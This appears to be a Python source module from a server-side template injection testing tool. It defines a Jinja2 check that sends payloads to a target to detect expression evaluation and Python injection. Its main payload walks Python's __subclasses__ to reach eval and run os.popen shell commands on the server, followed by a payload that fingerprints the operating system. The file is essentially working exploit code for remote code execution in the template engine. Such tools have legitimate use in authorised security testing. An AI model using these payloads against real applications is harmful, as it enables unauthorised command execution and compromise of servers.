from core.check import Check
from utils.loggers import log
import random
import string

class Jinja2(Check):
    
    def init(self):
        
        self.base_tag = '{{%s}}'
        
        self._check_reflection()
        
        if not self.get('reflection'):
            return
            
        log.warn('Reflection detected')
        
        self._check_python()
            
        if not self.get('language') or  not self.get('engine'):
            return
            
        log.warn('Python injection detected')   
        
        self._check_os()
        
        if not self.get('exec'):
            return
            
        log.warn(
            'Shell command execution detected on \'%s\' operating system' % (
                self.get('os', 'undetected')
            )
        )

    def _check_python(self):
        
        randA = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
        randB = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
        
        payload = '{{"%s".join("%s")}}' % (randA, randB)
        expected = randA.join(randB)
        
        if expected == self.req(payload):
            self.set('language', 'python')
            self.set('engine', 'jinja2')
    
    def _check_reflection(self):
        
        randA = random.randint(10, 100)
        randB = random.randint(10, 100)

        payload = '{{%i*%i}}' % (randA, randB)
        expected = str(randA*randB)
        
        if expected == self.req(payload):
            self.set('reflection', True)
        
    def _check_os(self):
        
        expected_rand = str(random.randint(999, 10000))
        payload = """{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
{%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
{%% if 'eval' in b.keys() %%}
{{ b['eval']('__import__("os").popen("echo %s").read()') }}
{%% endif %%} {%% endif %%} {%% endfor %%}
{%% endif %%} {%% endfor %%}""" % expected_rand
                
                
        if expected_rand == self.req(payload):
            self.set('exec', True)      

        payload = """{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %}
{% for b in c.__init__.func_globals.values() %} {% if b.__class__ == {}.__class__ %}
{% if 'eval' in b.keys() %}
{{ b['eval']('__import__("os").name') }}-{{ b['eval']('__import__("sys").platform') }}
{% endif %} {% endif %} {% endfor %}
{% endif %} {% endfor %}"""
                
        self.set('os', self.req(payload))